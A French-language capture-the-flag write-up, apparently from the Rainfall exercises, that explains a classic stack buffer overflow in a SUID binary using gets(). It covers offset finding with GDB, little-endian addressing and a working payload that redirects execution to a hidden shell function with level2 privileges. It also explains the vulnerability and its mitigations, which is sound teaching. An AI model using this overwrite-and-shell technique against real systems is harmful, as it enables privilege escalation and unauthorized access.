# Level1 - README Pédagogique

## 🎯 Objectif
Exploiter un **buffer overflow** pour rediriger le flux d'exécution vers une fonction `run()` qui n'est jamais appelée normalement.

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level1
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level2
```

### Tests comportementaux
```bash
$ ./level1
test
[rien ne se passe]

$ python -c "print('A' * 100)" | ./level1
Segmentation fault (core dumped)
```

**Observation** : Le programme crash avec beaucoup d'input → **buffer overflow détecté**.

---

## 🛠️ Analyse technique

### Code décompilé (Ghidra)
```c
void main(void)
{
    char buffer[64];
    gets(buffer);  // ⚠️ Fonction dangereuse, pas de vérification de longueur !
}

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}
```

**Observations critiques** :
1. `gets()` ne vérifie **jamais** la longueur de l'input
2. La fonction `run()` existe mais n'est **jamais appelée**
3. `run()` contient un appel à `system("/bin/sh")`

### Analyse GDB
```bash
$ gdb level1
(gdb) info functions
```

**Résultat** :
```
0x08048444  run
0x08048480  main
```

**Adresse de `run()`** : `0x08048444`

---

## 💣 Vulnérabilité : Buffer Overflow

### Qu'est-ce qu'un buffer overflow ?

Un **buffer overflow** se produit quand on écrit plus de données qu'un buffer peut en contenir, ce qui écrase les données adjacentes en mémoire.

**Code vulnérable** :
```c
char buffer[64];
gets(buffer);  // ⚠️ Lit TOUT l'input, quelle que soit sa longueur !
```

**Analogie** : Un verre de 250ml.
- Tu verses 250ml → OK ✅
- Tu verses 500ml → Déborde et renverse sur la table 💧

### Comment ça fonctionne ?

#### Structure de la stack (avant overflow)
```
Adresses hautes
┌─────────────────────┐
│   Saved EBP         │ ← 4 octets
├─────────────────────┤
│   Saved EIP         │ ← 4 octets (adresse de retour)
├─────────────────────┤
│   Padding           │ ← 8 octets (alignement)
├─────────────────────┤
│   buffer[64]        │ ← 64 octets
└─────────────────────┘
Adresses basses

Total avant Saved EIP : 64 + 8 + 4 = 76 octets
```

#### Après le buffer overflow
```
┌─────────────────────┐
│   0x08048444        │ ← ÉCRASÉ par notre adresse (run) ✅
├─────────────────────┤
│   AAAA              │ ← ÉCRASÉ (saved EBP, on s'en fout)
├─────────────────────┤
│   AAAAAAAA...       │ ← 76 octets de 'A'
└─────────────────────┘
```

**Au moment du `ret`** :
```asm
ret  # Équivalent à : EIP = pop()
     # EIP = 0x08048444 (adresse de run)
     # Le CPU saute vers run() ! ✅
```

---

## 🔑 Concepts clés

### 1. Le registre EIP (Instruction Pointer)

**EIP** = **Extended Instruction Pointer**

**Rôle** : Contient l'adresse de la **prochaine instruction** à exécuter.

```
CPU lit l'instruction à l'adresse contenue dans EIP
→ Exécute l'instruction
→ Incrémente EIP (ou le modifie avec un jump/call)
→ Répète
```

**Pourquoi c'est critique ?**
- Contrôler EIP = contrôler le flux d'exécution du programme
- Buffer overflow → écraser la saved return address → contrôler EIP

### 2. La saved return address

Quand une fonction est appelée :

```asm
call function
    ↓
1. Empile l'adresse de retour (saved return address)
2. Saute vers function

function:
    # ... code de la fonction ...
    ret
    ↓
3. Dépile la saved return address
4. Charge cette adresse dans EIP
5. Continue l'exécution
```

**Dans un buffer overflow** :
- On écrase la saved return address sur la stack
- Au `ret`, le CPU charge NOTRE adresse dans EIP
- On redirige le programme où on veut ! 🎯

### 3. L'offset

**Offset** = Distance entre le début du buffer et la saved return address.

**Comment le trouver ?**

#### Méthode 1 : Analyse statique (Ghidra)
```c
char buffer[64];  // 64 octets
// + 8 octets de padding (alignement)
// + 4 octets de saved EBP
// = 76 octets avant saved EIP
```

#### Méthode 2 : Pattern cyclique manuel

**Créer un pattern unique** :
```bash
# Pattern où chaque groupe de 4 caractères est unique
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...
```

**Tester avec GDB** :
```bash
$ gdb level1
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
^D

Program received signal SIGSEGV
(gdb) info registers eip
eip  0x37634136  # En ASCII : "6Ac7"
```

**Trouver l'offset** :
```bash
# Chercher "6Ac7" dans le pattern
# Position de "6Ac7" dans le pattern = 76

# Vérification :
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
^D
(gdb) info registers eip
eip  0x42424242  # "BBBB" → confirme offset = 76
```

### 4. Little-endian

**Définition** : Convention de stockage des octets en mémoire (octet de poids **faible** en premier).

**Exemple** :
```
Adresse : 0x08048444

En little-endian :
  Octet 1 : 0x44 (poids faible)
  Octet 2 : 0x84
  Octet 3 : 0x04
  Octet 4 : 0x08 (poids fort)

Représentation : \x44\x84\x04\x08
```

**Conversion rapide** :
```
0x08048444
  08 04 84 44  (paires d'octets)
  44 84 04 08  (inversé) → \x44\x84\x04\x08
```

**Pourquoi x86 utilise le little-endian ?**
- Héritage historique Intel 8080
- Simplifie l'arithmétique multi-octets
- Rétrocompatibilité depuis 40+ ans

### 5. La fonction gets()

**Prototype** :
```c
char *gets(char *str);
```

**Problème** : Ne vérifie **JAMAIS** la longueur de l'input.

```c
char buffer[10];
gets(buffer);  // Si l'utilisateur tape 100 caractères → BOOM 💥
```

**gets() est deprecated et INTERDITE** dans tout code moderne !

**Alternative sécurisée** :
```c
char buffer[64];
fgets(buffer, sizeof(buffer), stdin);  // Limite à 64 octets ✅
```

### 6. Dead code (code mort)

**Définition** : Code présent dans le binaire mais jamais exécuté normalement.

**Dans Level1** :
```c
void run(void) {  // ← Fonction jamais appelée
    system("/bin/sh");
}
```

**Pourquoi c'est exploitable ?**
- Le code existe en mémoire
- On peut rediriger EIP vers son adresse
- Le programme l'exécute comme si elle avait été appelée normalement

### 7. Le trick du `cat`

**Problème** : Le shell se ferme immédiatement après l'exploit.

```bash
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
# /bin/sh se lance mais stdin est fermé (EOF)
# → Le shell se termine immédiatement ❌
```

**Solution** : Utiliser `cat` pour garder stdin ouvert.

```bash
$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
whoami         # ← Tu tapes ça
level2         # ← Réponse du shell ✅
```

**Explication** :
1. `python -c` envoie le payload → lance /bin/sh
2. `cat` (sans arguments) lit stdin et l'écrit sur stdout
3. Tout ce que tu tapes → `cat` → stdin de /bin/sh
4. Le shell reste ouvert et exécute tes commandes ✅

**Visualisation** :
```
Clavier → cat → stdin → /bin/sh → stdout → Terminal
```

---

## 🚀 Construction du payload

### Structure du payload
```
[76 octets de padding] + [Adresse de run en little-endian]
```

### Calcul détaillé
```
Offset = 76 octets (buffer + padding + saved EBP)
Adresse de run() = 0x08048444
Little-endian = \x44\x84\x04\x08

Payload final :
  'A' × 76 + '\x44\x84\x04\x08'
```

### Commande d'exploitation

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

---

## 🔄 Déroulement de l'exploitation

### Étape par étape

1. **Lancement du programme**
   ```bash
   ./level1
   ```

2. **gets() attend l'input**
   ```c
   gets(buffer);  // Attend sur stdin
   ```

3. **On envoie le payload**
   ```
   AAAA...AAAA (76 octets) + \x44\x84\x04\x08
   ```

4. **Buffer overflow**
   ```
   - Les 76 premiers octets remplissent buffer + padding + saved EBP
   - Les 4 suivants écrasent saved EIP avec 0x08048444
   ```

5. **gets() se termine, exécute `ret`**
   ```asm
   ret  # EIP = pop() = 0x08048444
   ```

6. **Le CPU saute vers run()**
   ```c
   void run(void) {
       fwrite("Good... Wait what?\n", 1, 19, stdout);
       system("/bin/sh");  // ← On arrive ici ! ✅
   }
   ```

7. **Shell obtenu**
   ```bash
   $ whoami
   level2
   ```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-120** : Buffer Overflow (Classic Buffer Overflow)
- **CWE-676** : Use of Potentially Dangerous Function (gets)
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

---

## 🎓 Résumé

1. **Vulnérabilité** : `gets()` sans vérification de longueur
2. **Faille** : Buffer overflow écrase la saved return address
3. **Exploitation** : Rediriger EIP vers `run()` (0x08048444)
4. **Technique** : 76 octets de padding + adresse en little-endian
5. **Résultat** : Shell avec les privilèges de level2
6. **Trick** : Utiliser `cat` pour garder stdin ouvert

---

## 🔐 Protection (non présente ici)

Dans un système moderne, ces protections empêcheraient l'exploit :

1. **Stack Canary** : Valeur aléatoire avant saved EIP, vérifiée avant `ret`
2. **ASLR** : Randomisation des adresses mémoire
3. **NX/DEP** : Stack non-exécutable
4. **RELRO** : Protection des sections mémoire

**Dans Rainfall** : Toutes ces protections sont **désactivées** pour l'apprentissage.

---

## 🎯 Points clés à retenir

- **gets() = DANGER** : Toujours utiliser `fgets()` ou `read()` avec limite
- **EIP contrôle tout** : Contrôler EIP = contrôler le programme
- **Little-endian** : Inverser l'ordre des octets pour les adresses
- **Offset = distance** : Du début du buffer à la saved return address
- **cat trick** : Maintient stdin ouvert pour le shell
- **Dead code** : Fonctions non appelées mais exploitables